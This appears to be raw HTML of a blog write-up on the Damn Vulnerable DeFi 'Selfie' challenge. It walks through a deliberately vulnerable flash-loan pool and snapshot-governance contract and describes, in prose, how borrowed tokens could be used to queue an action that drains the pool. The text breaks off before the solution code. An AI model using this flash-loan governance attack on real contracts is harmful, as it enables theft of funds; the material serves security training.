viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Dependency</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"./SimpleGovernance.sol\";</code></pre></div>\n<ul>\n<li>The @Openzeppelin external library contract is dependent on ReentrancyGuard, ERC20Snapshot, Address.</li>\n<li>Using the internal contract SimpleGovernance.</li>\n</ul>\n<h3 id=\"state-variables\" style=\"position:relative;\"><a href=\"#state-variables\" aria-label=\"state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variables</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">ERC20Snapshot public token;\nSimpleGovernance public governance;</code></pre></div>\n<ul>\n<li>Variable for initial instance to use other contract. Allocate ERC20 snapshot token and SimpleGovernance contract distribution address values, respectively.</li>\n</ul>\n<h3 id=\"fucntions\" style=\"position:relative;\"><a href=\"#fucntions\" aria-label=\"fucntions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fucntions</h3>\n<p><code class=\"language-text\">modifier onlyGovernance()</code></p>\n<p>✅ Checks whether the value of the msg.sender address is the same as the “governance contract” address, and only if governance conditions are met, it can pass that modifier.</p>\n<p><code class=\"language-text\">constructor(address tokenAddress, address governanceAddress)</code></p>\n<ul>\n<li>token, governance Set the address of each deployed contract to the contract assignment variable value.</li>\n</ul>\n<p><code class=\"language-text\">function flashLoan(uint256 borrowAmount) external nonReentrant</code></p>\n<p>✅ In order to pass the condition, the value received as the borrowAmount argument of this function must be equal to or less than the balance value of ERC20Snapshot tokend. (Basic logic for getting a loan)</p>\n<ul>\n<li>Based on the transfer function of the ERC20Snapshot token, the token is transferred to msg.sender as much as the borrowAmount value.</li>\n</ul>\n<p>✅ msg.sender checks whether it is a deployed contract based on the isContract() function.</p>\n<ul>\n<li>Executes the msg.sender.functionCall command and calls receiveTokens(address, uint256) with the ABI function selector based on msg.sender.</li>\n</ul>\n<p>✅ After making a loan, we check to see if the loan has been returned to the borrower.</p>\n<p>☑️ Must pass onlyGovernance modifier.</p>\n<ul>\n<li>Based on the ERC20Snapshot token contract function transfer, the token is delivered as much as the amount value (balance of the token contract) to the receiver of this function parameter.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../DamnValuableTokenSnapshot.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title SimpleGovernance\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SimpleGovernance</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">GovernanceAction</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">address</span> receiver<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">bytes</span> data<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> weiAmount<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> proposedAt<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> executedAt<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    DamnValuableTokenSnapshot <span class=\"token keyword\">public</span> governanceToken<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> <span class=\"token operator\">=></span> GovernanceAction<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> actions<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> actionCounter<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> ACTION_DELAY_IN_SECONDS <span class=\"token operator\">=</span> <span class=\"token number\">2</span> days<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">ActionQueued</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> actionId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> caller<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">ActionExecuted</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> actionId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> caller<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> governanceTokenAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>governanceTokenAddress <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Governance token cannot be zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        governanceToken <span class=\"token operator\">=</span> <span class=\"token function\">DamnValuableTokenSnapshot</span><span class=\"token punctuation\">(</span>governanceTokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        actionCounter <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">queueAction</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> receiver<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> data<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> weiAmount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">_hasEnoughVotes</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough votes to propose an action\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>receiver <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Cannot queue actions that affect Governance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> actionId <span class=\"token operator\">=</span> actionCounter<span class=\"token punctuation\">;</span>\n\n        GovernanceAction <span class=\"token keyword\">storage</span> actionToQueue <span class=\"token operator\">=</span> actions<span class=\"token punctuation\">[</span>actionId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        actionToQueue<span class=\"token punctuation\">.</span>receiver <span class=\"token operator\">=</span> receiver<span class=\"token punctuation\">;</span>\n        actionToQueue<span class=\"token punctuation\">.</span>weiAmount <span class=\"token operator\">=</span> weiAmount<span class=\"token punctuation\">;</span>\n        actionToQueue<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span>\n        actionToQueue<span class=\"token punctuation\">.</span>proposedAt <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\n\n        actionCounter<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">ActionQueued</span><span class=\"token punctuation\">(</span>actionId<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> actionId<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">executeAction</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> actionId<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">_canBeExecuted</span><span class=\"token punctuation\">(</span>actionId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Cannot execute this action\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        GovernanceAction <span class=\"token keyword\">storage</span> actionToExecute <span class=\"token operator\">=</span> actions<span class=\"token punctuation\">[</span>actionId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        actionToExecute<span class=\"token punctuation\">.</span>executedAt <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\n\n        actionToExecute<span class=\"token punctuation\">.</span>receiver<span class=\"token punctuation\">.</span><span class=\"token function\">functionCallWithValue</span><span class=\"token punctuation\">(</span>\n            actionToExecute<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">,</span>\n            actionToExecute<span class=\"token punctuation\">.</span>weiAmount\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">ActionExecuted</span><span class=\"token punctuation\">(</span>actionId<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getActionDelay</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> ACTION_DELAY_IN_SECONDS<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev an action can only be executed if:\n     * 1) it's never been executed before and\n     * 2) enough time has passed since it was first proposed\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_canBeExecuted</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> actionId<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        GovernanceAction <span class=\"token keyword\">memory</span> actionToExecute <span class=\"token operator\">=</span> actions<span class=\"token punctuation\">[</span>actionId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n            actionToExecute<span class=\"token punctuation\">.</span>executedAt <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span>\n            <span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">-</span> actionToExecute<span class=\"token punctuation\">.</span>proposedAt <span class=\"token operator\">>=</span> ACTION_DELAY_IN_SECONDS<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">_hasEnoughVotes</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint256</span> balance <span class=\"token operator\">=</span> governanceToken<span class=\"token punctuation\">.</span><span class=\"token function\">getBalanceAtLastSnapshot</span><span class=\"token punctuation\">(</span>account<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> halfTotalSupply <span class=\"token operator\">=</span> governanceToken<span class=\"token punctuation\">.</span><span class=\"token function\">getTotalSupplyAtLastSnapshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> balance <span class=\"token operator\">></span> halfTotalSupply<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"dependency-1\" style=\"position:relative;\"><a href=\"#dependency-1\" aria-label=\"dependency 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Dependency</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">import \"../DamnValuableTokenSnapshot.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";</code></pre></div>\n<ul>\n<li>Use the Address contract of the <code class=\"language-text\">@Openzeppelin</code> library contract.</li>\n<li>Use the <code class=\"language-text\">DamnValuableTokenSnapshot</code> contract.</li>\n</ul>\n<h3 id=\"state-vairables\" style=\"position:relative;\"><a href=\"#state-vairables\" aria-label=\"state vairables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Vairables</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">GovernanceAction</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">address</span> receiver<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">bytes</span> data<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> weiAmount<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> proposedAt<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> executedAt<span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>It is used as a dependent structure in the Governance contract, and each member variable can be confirmed as data necessary for the logic configuration of the contract.</li>\n<li>Let’s take a brief look at each variable. Allocate address receiver contract address and user account address. Since the bytes data variable is assigned a value of the bytes type, it can contain specific data. The uint256 weAmount variable allocates the amount of tokens on a wei basis. The uint256 propsedAt variable is used to measure the time of the Goverence condition. The executedAt variable is used to record the function executeAction call. Each data structure is governed by Goverence Action logic.</li>\n</ul>\n<p><code class=\"language-text\">mapping(uint256 => GovernanceAction) public actions</code></p>\n<ul>\n<li>This is a mapping structure to manage the GovernanceAction Struct explained above, and manages each structure with a key value named ActionID in the increment state.</li>\n</ul>\n<p><code class=\"language-text\">uint256 private actionCounter</code></p>\n<ul>\n<li>It is a variable to measure the Coutner of the ActionID value when each Action structure is assigned to manage the action structures.</li>\n</ul>\n<p><code class=\"language-text\">uint256 private ACTION_DELAY_IN_SECONDS = 2 days;</code></p>\n<ul>\n<li>It is used to measure whether the executeAction function can be called inside the function _canBeExecuted(uint256 actionId) function based on the time of 2 days.</li>\n</ul>\n<h2 id=\"functions\" style=\"position:relative;\"><a href=\"#functions\" aria-label=\"functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h2>\n<p><code class=\"language-text\">constructor (address governanceTokenAddress)</code></p>\n<p>✅ governanceTokenAddress The argument to this function must have a value other than address(0) to pass.</p>\n<ul>\n<li>\n<p>Assign the DamnValuableTokenSnapshot deployed contract address to the governanceToken state variable.</p>\n</li>\n<li>\n<p>actionCounter Initializes the value of the management variable.</p>\n</li>\n</ul>\n<p><code class=\"language-text\">function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns(uint256)</code></p>\n<p>✅ <code class=\"language-text\">_hasEnoughVotes(msg.sender)</code> function call return condition must be True to pass.</p>\n<p>📥 <code class=\"language-text\">function _hasEnoughVotes(address account) private view returns (bool)</code></p>\n<ul>\n<li>Measures whether this user has the right to vote in Governance. In order to be eligible to vote, the holding <code class=\"language-text\">balance</code> value must be greater than the <code class=\"language-text\">governanceToken.TotalSupply / 2</code> value. Return data will return True/False depending on whether voting is possible or not.</li>\n</ul>\n<p>📤 <code class=\"language-text\">queueAction</code></p>\n<p>✅ <code class=\"language-text\">queueAction</code> Among the arguments of the function, the address value of the receiver\nmust not be the same as the address of the current contract.</p>\n<ul>\n<li>Among <code class=\"language-text\">GovernanceAction</code> Structs, data is fetched and assigned from the mapping structure based on the current actionId key value. (Stored in the transaction.)</li>\n<li>Set values to member variables of <code class=\"language-text\">GovernanceAction</code> structure retrieved with <code class=\"language-text\">actionId</code>.GovernanceAction storage actionToQueue = actions[actionId]; actionToQueue.receiver = receiver;actionToQueue.weiAmount = weiAmount;actionToQueue.data = data;actionToQueue.proposedAt = block.timestamp;</li>\n<li>Increases the actionCounter state variable. (for measurement)</li>\n<li>Returns the set actionId value.</li>\n</ul>\n<p><code class=\"language-text\">function executeAction(uint256 actionId) external payable</code></p>\n<p>✅ <code class=\"language-text\">_canBeExecuted(actionId)</code> Pass the condition based on the return value.</p>\n<p>📥 <code class=\"language-text\">function _canBeExecuted(uint256 actionId) private view returns (bool)</code></p>\n<ul>\n<li>\n<p>Among the <code class=\"language-text\">GovernanceAction</code> structures, the data mapped to the <code class=\"language-text\">actionId</code> value is temporarily allocated to the memory state.</p>\n</li>\n<li>\n<p>The value of the <code class=\"language-text\">.executedAt</code> variable must be zero. It must have never actually been executed, and <code class=\"language-text\">proposedAt</code> must have been <code class=\"language-text\">2 days</code> from the current time.</p>\n</li>\n</ul>\n<p>📤 <code class=\"language-text\">executeAction</code></p>\n<ul>\n<li>\n<p>.<code class=\"language-text\">executeAt</code> assign a variable value based on the current time.</p>\n</li>\n<li>\n<p><code class=\"language-text\">.receiver</code> invokes the <code class=\"language-text\">functionCallWithvalue</code> command based on the address of the</p>\n</li>\n</ul>\n<p>variable. Required ABI function selectors and parameters are called using member variables defined in the structure.</p>\n<h2 id=\"vulnerability\" style=\"position:relative;\"><a href=\"#vulnerability\" aria-label=\"vulnerability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability</h2>\n<p>The flashLoan contract allows users to use the flashLoan service. The actual access itself can be used by anyone, and it is possible to borrow as much as the balance value of the tokenPool contract.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span><span class=\"token function\">functionCall</span><span class=\"token punctuation\">(</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span>\n                <span class=\"token string\">\"receiveTokens(address,uint256)\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                borrowAmount\n            <span class=\"token punctuation\">)</span>\n <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>An attack vector exists that can call the <code class=\"language-text\">receiveTokens</code> function, which is not implemented in the flashLoan structure. If the attacker calls the flashLoan function and executes this <code class=\"language-text\">fucntionCall</code>, and implements the <code class=\"language-text\">receiveTokens</code> function intentionally, the actual handling becomes possible, so unintended logic desired by the attacker may be executed.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">drainAllFunds</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> receiver<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyGovernance <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint256</span> amount <span class=\"token operator\">=</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>receiver<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">emit</span> <span class=\"token function\">FundsDrained</span><span class=\"token punctuation\">(</span>receiver<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span></code></pre></div>\n<p>In the case of the <code class=\"language-text\">drainAllFunds</code> function, if the <code class=\"language-text\">onlyGovernance</code> modifier can be passed, there is a possibility that the balance can be stolen using the <code class=\"language-text\">transfer</code> function of the tokenPool implemented inside.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">executeAction</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> actionId<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">_canBeExecuted</span><span class=\"token punctuation\">(</span>actionId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Cannot execute this action\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        GovernanceAction <span class=\"token keyword\">storage</span> actionToExecute <span class=\"token operator\">=</span> actions<span class=\"token punctuation\">[</span>actionId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        actionToExecute<span class=\"token punctuation\">.</span>executedAt <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\n\n        actionToExecute<span class=\"token punctuation\">.</span>receiver<span class=\"token punctuation\">.</span><span class=\"token function\">functionCallWithValue</span><span class=\"token punctuation\">(</span>\n            actionToExecute<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">,</span>\n            actionToExecute<span class=\"token punctuation\">.</span>weiAmount\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">ActionExecuted</span><span class=\"token punctuation\">(</span>actionId<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span></code></pre></div>\n<p>When the <code class=\"language-text\">executeAction</code> function implemented inside the <code class=\"language-text\">simpleGovernance</code> contract is called, the <code class=\"language-text\">functionCallWithValue</code> command can be executed with the <code class=\"language-text\">receiver</code> address based on the values of each action structure configured in this contract, so that the available functions of other contracts can be called from this Governance contract address. It can be used as an attack vector.</p>\n<h2 id=\"solve\" style=\"position:relative;\"><a href=\"#solve\" aria-label=\"solve permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 